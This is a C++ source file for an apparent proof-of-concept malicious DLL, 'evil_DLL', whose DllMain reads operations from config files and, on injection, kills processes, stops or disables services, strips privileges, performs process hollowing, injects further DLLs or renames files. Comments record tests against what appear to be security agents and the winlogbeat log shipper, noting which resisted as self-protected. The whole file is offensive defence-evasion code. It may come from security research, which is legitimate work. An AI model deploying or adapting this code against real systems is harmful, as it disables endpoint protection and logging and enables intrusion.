// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

#include "..\poc_InjectEject\fProcess.h"
#include "..\poc_InjectEject\InjectLib.h"
#include "..\poc_InjectEject\Helper.h"
#include <thread>

using namespace std;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	// read config
	const wchar_t* fOperation;
	const wchar_t* fObject;
	const wchar_t* freflectDll;

	std::thread thread1;
	int delay = 0;
	bool threaded = false;
	POC_Helper::ConfigInfo my_config;
	POC_Helper::ConfigInfo delay_config;
	POC_Helper::ConfigInfo thread_config;
	const wchar_t* configPath = L"c:\\logs\\evil.conf";
	const wchar_t* delay_configPath = L"c:\\logs\\evil.delay";
	const wchar_t* thread_configPath = L"c:\\logs\\evil.thread";
	OutputDebugString((TEXT("[evil_DLL] readFile --> fileName = ") + (wstring)configPath).c_str());

	delay_config = POC_Helper::readFile(delay_configPath);
	my_config = POC_Helper::readFile(configPath);
	thread_config = POC_Helper::readFile(thread_configPath);

	fOperation = my_config[L"operation"].c_str();
	fObject = my_config[L"object"].c_str();
	freflectDll = my_config[L"reflectDll"].c_str();


	// redefine default action
	if (_wcsicmp(fOperation, L"default") == 0) {
		fOperation = L"killProcessByName";
		fObject = L"snsrv.exe";
	}

	OutputDebugString((TEXT("[evil_DLL] readFile --> Operation = ") + (wstring)fOperation).c_str());
	OutputDebugString((TEXT("[evil_DLL] readFile --> Object = ") + (wstring)fObject).c_str());
	OutputDebugString((TEXT("[evil_DLL] readFile --> reflectDll = ") + (wstring)freflectDll).c_str());
	
	if (delay_config[L"operation"] != L"default") {
		OutputDebugString(TEXT("[evil_DLL] readFileDelay --> Delay = 30 sec"));
		delay = 30;
	}

	if (thread_config[L"operation"] != L"default") {
		OutputDebugString(TEXT("[evil_DLL] Threaded --> True"));
		threaded = true;
	}

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		

		//================================
		//Select working mode 
		//================================
		//		-----> killProcessByName
		if (_wcsicmp(fOperation, L"killProcessByName") == 0) {
			OutputDebugString((TEXT("[evil_DLL] DEFAULT ACTION = killProcessByName PROCESS = ") + (wstring)fObject).c_str());
			if (POC_fProcess::killProcessByName(fObject, delay)) {
				OutputDebugString(TEXT("[evil_DLL] killProcessByName = SUCCESS"));
			}
			else {
				OutputDebugString(TEXT("[evil_DLL] killProcessByName = FAIL"));
			}
		}

		//		-----> Echo
		if (_wcsicmp(fOperation, L"Echo") == 0) {
			OutputDebugString((TEXT("[evil_DLL] ACTION = Echo DEST_PATH = ") + (wstring)fObject).c_str());
			if (threaded) {
				OutputDebugString(TEXT("[evil_DLL] Echo THREADED"));
				std::thread thread1(POC_fProcess::Echo, fObject, (LPWSTR)freflectDll, delay, false);
			}
			else {

				if (POC_fProcess::Echo(fObject, (LPWSTR)freflectDll, delay, threaded)) {
					OutputDebugString(TEXT("[evil_DLL] Echo = SUCCESS"));
				}
				else {
					OutputDebugString(TEXT("[evil_DLL] Echo = FAIL"));
				}
			}
		}


		//		-----> RemoveAllPrivileges
		if (_wcsicmp(fOperation, L"RemoveAllPrivileges") == 0) {
			OutputDebugString((TEXT("[evil_DLL] ACTION = RemoveAllPrivileges PROCESS = ") + (wstring)fObject).c_str());
			if (POC_fProcess::RemoveAllPrivileges(fObject, delay)) {
				OutputDebugString(TEXT("[evil_DLL] RemoveAllPrivileges = SUCCESS"));
			}
			else {
				OutputDebugString(TEXT("[evil_DLL] RemoveAllPrivileges = FAIL"));
			}
		}


		//		-----> NTkillProcessByName
		if (_wcsicmp(fOperation, L"NTkillProcessByName") == 0) {
			OutputDebugString((TEXT("[evil_DLL] ACTION = NTkillProcessByName PROCESS = ") + (wstring)fObject).c_str());
			if (POC_fProcess::NTkillProcessByName(fObject, delay)) {
				OutputDebugString(TEXT("[evil_DLL] NTkillProcessByName = SUCCESS"));
			}
			else {
				OutputDebugString(TEXT("[evil_DLL] NTkillProcessByName = FAIL"));
			}
		}

		//		-----> StartHollowed
		if (_wcsicmp(fOperation, L"StartHollowed") == 0) {
			OutputDebugString((TEXT("[evil_DLL] ACTION = StartHollowed PROCESS = ") + (wstring)fObject).c_str());
			if (POC_fProcess::StartHollowed((LPWSTR)fObject, (LPWSTR)freflectDll, delay)) {
				OutputDebugString(TEXT("[evil_DLL] StartHollowed = SUCCESS"));
			}
			else {
				OutputDebugString(TEXT("[evil_DLL] StartHollowed = FAIL"));
			}
		}

		//		-----> StopService
		if (_wcsicmp(fOperation, L"StopService") == 0) {
			OutputDebugString((TEXT("[evil_DLL] DEFAULT ACTION = StopService PROCESS = ") + (wstring)fObject).c_str());
			if (POC_fProcess::StopService(fObject, delay)) {
				OutputDebugString(TEXT("[evil_DLL] StopService = SUCCESS"));
			}
			else {
				OutputDebugString(TEXT("[evil_DLL] StopService = FAIL"));
			}
		}


		//		-----> SetServiceType_DISABLE
		if (_wcsicmp(fOperation, L"SetServiceType_DISABLE") == 0) {
			OutputDebugString((TEXT("[evil_DLL] DEFAULT ACTION = SetServiceType_DISABLE PROCESS = ") + (wstring)fObject).c_str());
			if (POC_fProcess::SetServiceType_DISABLE(fObject, delay)) {
				OutputDebugString(TEXT("[evil_DLL] SetServiceType_DISABLE = SUCCESS"));
			}
			else {
				OutputDebugString(TEXT("[evil_DLL] SetServiceType_DISABLE = FAIL"));
			}
		}



		//		-----> InjectLib
		if (_wcsicmp(fOperation, L"InjectLib") == 0) {
			OutputDebugString((TEXT("[evil_DLL] ACTION = InjectLib PROCESS = ") + (wstring)fObject).c_str());
			if (POC_InjectLib::InjectLib(POC_fProcess::FindProcessID(fObject), freflectDll)) {
				OutputDebugString(TEXT("[evil_DLL] InjectLib = SUCCESS"));
			}
			else {
				OutputDebugString(TEXT("[evil_DLL] InjectLib = FAIL"));
			}
		}


		//		-----> RenameFile
		if (_wcsicmp(fOperation, L"RenameFile") == 0) {
			OutputDebugString((TEXT("[evil_DLL] ACTION = RenameFile OBJECT = ") + (wstring)fObject).c_str());
			if (POC_fProcess::RenameFile(fObject, freflectDll, delay) == 0) {
				OutputDebugString(TEXT("[evil_DLL] RenameFile = SUCCESS"));
			}
			else {
				OutputDebugString(TEXT("[evil_DLL] RenameFile = FAIL"));
			}
		}


		//		-----> MessageBox
		if (_wcsicmp(fOperation, L"MessageBox") == 0) {
			OutputDebugString((TEXT("[evil_DLL] MessageBox = MessageBox PROCESS = ") + (wstring)fObject).c_str());
			MessageBox(NULL, L"evilDLL Attached", L"evilDLL", 0);



		//		-----> UNKNOWN fOperation, then killProcessByName (snsrv.exe)
		} 
		
		if (_wcsicmp(fOperation, L"default") == 0) {
			OutputDebugString(TEXT("[evil_DLL] DEFAULT ACTION = killProcessByName PROCESS = snsrv.exe"));
			if (POC_fProcess::killProcessByName(L"snsrv.exe", delay)) {
				OutputDebugString(TEXT("[evil_DLL] killProcessByName = SUCCESS"));
			}
			else {
				OutputDebugString(TEXT("[evil_DLL] killProcessByName = FAIL"));
			}
		}


		//MessageBox(NULL, L"Process attach!", L"Inject All The Things!", 0);

		//StopService(L"winlogbeat");		// OK
		//StopService(L"snsrv");		// FAIL (guess is NOT_STOPPABLE)
		//StopService(L"snddd"); // may be OK - instance still running, but now NOT_STOPPABLE ?who changed?
		//StopService(L"snsdd"); // may be OK - instance still running, but now NOT_STOPPABLE ?who changed?

		//SetServiceType_DISABLE(L"winlogbeat");	// OK
		//SetServiceType_DISABLE(L"snsrvservice");	// FAIL selfprotected
		//SetServiceType_DISABLE(L"snddd"); // FAIL selfprotected

		//killProcessByName(L"snichecksrv.exe");	// OK
		//killProcessByName(L"snicon.exe");	// OK

		//InjectLib(FindProcessID(L"snsrv.exe"), L"d:\\_tmp\\1\\1\\dllmain.dll");	// OK

		break;
	case DLL_PROCESS_DETACH:
		if (threaded) {
			OutputDebugString(TEXT("[evil_DLL] WAIT THREAD FINISH"));
			thread1.join();
		}
		break;
	case DLL_THREAD_ATTACH:
		//killProcessByName(L"snichecksrv.exe");	// OK

		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

